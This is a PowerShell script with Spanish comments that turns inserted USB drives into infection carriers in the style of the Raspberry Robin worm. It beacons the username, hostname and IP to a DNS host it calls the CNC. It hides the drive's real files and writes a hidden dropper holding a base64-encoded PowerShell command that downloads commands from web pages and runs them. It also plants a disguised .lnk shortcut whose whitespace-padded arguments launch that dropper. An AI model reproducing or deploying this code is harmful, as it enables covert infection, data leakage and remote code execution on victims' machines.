Add-Content -Path $PSScriptRoot\output.txt -Value "$(Get-Date) - USB Flash Drive was inserted.";





#consige la unidad 
Get-WmiObject Win32_Volume | Where-Object { $_.DriveType -eq 2 } | ForEach-Object {
    $driveLetter = $_.DriveLetter
    $label = $_.Label
    Write-Host "La memoria USB con etiqueta '$label' está asignada a la unidad $driveLetter."
}
Add-Content -Path $PSScriptRoot\output.txt -Value "$(Get-Date) - USB Flash Drive nombre $label es unidad $driveLetter .";

#Notificamos la Entrada al CNC
# Obtener el nombre de usuario actualmente logado
$username = $env:USERNAME
# Obtener la dirección IP de la máquina actual
$ipAddress = (Test-Connection -ComputerName localhost -Count 1).IPv4Address.IPAddressToString
# Concatenar el subdominio con el nombre de usuario y la dirección IP
$subdomain = "USB_$label.$env:COMPUTERNAME.$username.$ipAddress.G12.pb6fy865rm7ts4ran9qi2ss2q.canarytokens.com"
# Realizar la consulta DNS
$result = Resolve-DnsName -Name $subdomain 
# Mostrar los resultados de la consulta DNS
if ($result) {
    Write-Host "La dirección IP del subdominio $subdomain es $($result.IPAddress)"
} else {
    Write-Host "No se pudo resolver la dirección IP del subdominio $subdomain"
}




# Set the path to the folder you want to work with
$folderPath = "$driveLetter"

# Create a subfolder

$subfolderPath = Join-Path -Path $folderPath -ChildPath "$label" 

If(!(test-path -PathType container $subfolderPath))
{

New-Item -ItemType Directory -Path $subfolderPath
}
# Copy all files to the subfolder
Get-ChildItem -Path $folderPath  | Move-Item -Destination $subfolderPath -force

# Make the subfolder invisible
$attrib = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System

(Get-Item $subfolderPath).Attributes = $attrib

#CREANDO LNK Y DROPPER
# Set the path to the file you want to create a shortcut for
$targetPath = "cmd.exe"
$dropperName = -join ((Get-Random -Count 3 -InputObject $charSet.ToCharArray())) + "." + -join ((Get-Random -Count 3 -InputObject $charSet.ToCharArray()))
$dropperPath = $driveLetter + "\"+$dropperName



#CREANDO DROPPER
$longitudArchivo = 1024
# Generamos una cadena aleatoria de caracteres para escribir en el archivo
$caracteres = "abcdefghijklmnopqrstuvwxyz0123456789"
# Rellenamos el archivo con caracteres aleatorios
$aleatorios = New-Object byte[] $longitudArchivo
$random = New-Object System.Random
$random.NextBytes($aleatorios)
[System.IO.File]::WriteAllBytes("$dropperPath", $aleatorios)
Write-Host $dropperPath

# Escribimos "start explorer" en una línea aleatoria del archivo
$lineas = Get-Content $dropperPath
$indice = Get-Random -Minimum 0 -Maximum $lineas.Count
$lineas[$indice] = "calc.exe"
$lineas | Set-Content "$dropperPath"
# Escribimos "Dropper" en una línea aleatoria del archivo
#$lineas = Get-Content $dropperPath
$indice = Get-Random -Minimum 0 -Maximum $lineas.Count
$lineas[$indice] = "powershell.exe -EncodedCommand IwBEAG8AdwBuAGwAbwBhAGQAZQByACAAQwBVAEMASABJAEIARQBSAFIAWQBSAE8AQgBJAE4ADQAKAA0ACgAkAGMAbwBuAHQAZQBuAHQAIAA9ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZwBvAG8AZwBsAGUALgBlAHMALwBhAGwAZQByAHQAcwAvAGYAZQBlAGQAcwAvADEANAAzADIAMgA1ADAANwA3ADAAMgA1ADUANgA1ADgANwA1ADUANAAvADcANAA5ADgAOAAzADgAMQA2ADQAOQAzADEAMQA0ADEANgA1ADUAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcADQAKACQAcABhAHQAcgBvAG4AIAA9ACAAJwAoAD8APAA9ACMAQwBVAEMASABJAFIATwBCAEkATgAgACkAKAAuACoAKQAoAD8APQAgACMARgBJAE4AKQAnAA0ACgAkAHIAZQBzAHUAbAB0AGEAZABvACAAPQAgAFsAcgBlAGcAZQB4AF0AOgA6AE0AYQB0AGMAaAAoACQAYwBvAG4AdABlAG4AdAAsACAAJABwAGEAdAByAG8AbgApAC4AVgBhAGwAdQBlAA0ACgANAAoADQAKACMAUwBFAEcAVQBOAEQAQQAgAE8AUABDAEkATwBOACAAIwBUAE8ARABPACAAQwBJAFAASABFAFIAIABYAE8AUgANAAoAaQBmACAAKAAoAFsAcwB0AHIAaQBuAGcAXQA6ADoASQBzAE4AdQBsAGwATwByAEUAbQBwAHQAeQAoACQAcgBlAHMAdQBsAHQAYQBkAG8AKQApACkADQAKAHsADQAKACQAYwBvAG4AdABlAG4AdAAgAD0AIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGIAaQBuAC4AYwBvAG0ALwByAGEAdwAvAEEAQgBpAFYAMAByAEgANwAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwANAAoADQAKACQAcABhAHQAcgBvAG4AIAA9ACAAJwAoAD8APAA9ACMAQwBVAEMASABJAFIATwBCAEkATgAgACkAKAAuACoAKQAoAD8APQAgACMARgBJAE4AKQAnAA0ACgAkAHIAZQBzAHUAbAB0AGEAZABvACAAPQAgAFsAcgBlAGcAZQB4AF0AOgA6AE0AYQB0AGMAaAAoACQAYwBvAG4AdABlAG4AdAAsACAAJABwAGEAdAByAG8AbgApAC4AVgBhAGwAdQBlAA0ACgB9AA0ACgANAAoADQAKAA0ACgAkAFQAaQB0AGwAZQAgAD0AIAAiAEMAdQBjAGgAaQBCAGUAcgByAHkAUgBPAGIAaQBuACIADQAKACQATQBlAHMAcwBhAGcAZQAgAD0AIAAiAEQAZQBzAGMAYQByAGcAYQBuAGQAbwAgAGMAbwBtAGEAbgBkAG8AIAAkAHIAZQBzAHUAbAB0AGEAZABvACIADQAKACQAVAB5AHAAZQAgAD0AIAAiAGkAbgBmAG8AIgAgAA0ACgAgACAADQAKAFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBsAG8AYQBkAHcAaQB0AGgAcABhAHIAdABpAGEAbABuAGEAbQBlACgAIgBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMAIgApACAAfAAgAG8AdQB0AC0AbgB1AGwAbAANAAoAJABwAGEAdABoACAAPQAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0AaQBkACAAJABwAGkAZAAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBFAHgAcABhAG4AZABQAHIAbwBwAGUAcgB0AHkAIABQAGEAdABoAA0ACgAkAGkAYwBvAG4AIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBJAGMAbwBuAF0AOgA6AEUAeAB0AHIAYQBjAHQAQQBzAHMAbwBjAGkAYQB0AGUAZABJAGMAbwBuACgAJABwAGEAdABoACkADQAKACQAbgBvAHQAaQBmAHkAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AdwBpAG4AZABvAHcAcwAuAGYAbwByAG0AcwAuAG4AbwB0AGkAZgB5AGkAYwBvAG4ADQAKACQAbgBvAHQAaQBmAHkALgBpAGMAbwBuACAAPQAgACQAaQBjAG8AbgANAAoAJABuAG8AdABpAGYAeQAuAHYAaQBzAGkAYgBsAGUAIAA9ACAAJAB0AHIAdQBlAA0ACgAkAG4AbwB0AGkAZgB5AC4AcwBoAG8AdwBiAGEAbABsAG8AbwBuAHQAaQBwACgAMQAwACwAJABUAGkAdABsAGUALAAkAE0AZQBzAHMAYQBnAGUALAAgAFsAcwB5AHMAdABlAG0ALgB3AGkAbgBkAG8AdwBzAC4AZgBvAHIAbQBzAC4AdABvAG8AbAB0AGkAcABpAGMAbwBuAF0AOgA6ACQAVAB5AHAAZQApAA0ACgANAAoADQAKAA0ACgAjAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAHIAZQBzAHUAbAB0AGEAZABvAA0ACgANAAoADQAKAA0ACgBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAHIAZQBzAHUAbAB0AGEAZABvAA0ACgA=  "
$lineas | Set-Content "$dropperPath"
#Hago el dropper protegido
Set-ItemProperty $dropperPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::ReadOnly)



# Escribimos más caracteres absurdos
#Add-Content "$dropperPath" "$caracteres"





# Set the path to where you want to create the shortcut
$shortcutPath = "$driveLetter\$label.lnk"

# Set the character set to use for the random string
$charSet = "CUCHIBERRYROBIN"

# Generate a random string of length 100 using the character set
$description = -join ((Get-Random -Count 100 -InputObject $charSet.ToCharArray()))

# Create a WScript.Shell object
$shell = New-Object -ComObject WScript.Shell

# Create the shortcut
$shortcut = $shell.CreateShortcut($shortcutPath)

# Set the shortcut properties
# Set the path to the file you want to create a shortcut for
$targetPath = "C:\Windows\System32\cmd.exe"
$shortcut.RelativePath = ""
$shortcut.TargetPath = $targetPath
$shortcut.WindowStyle = 7
$shortcut.Description = $description
# Set the icon to the removable drive icon
$iconLocation = "%SystemRoot%\System32\imageres.dll,27"
$shortcut.IconLocation = $iconLocation
# Set the arguments to run the command from the arg file
$shortcut.Arguments = "
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
          /V/RcmD<$dropperName"

# Save the shortcut
$shortcut.Save()


#MENSJAE DE USB PROCESADO
$Title = "CuchiBerryRObin"
$Message = "USB puteado con exito"
$Type = "info" 
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)

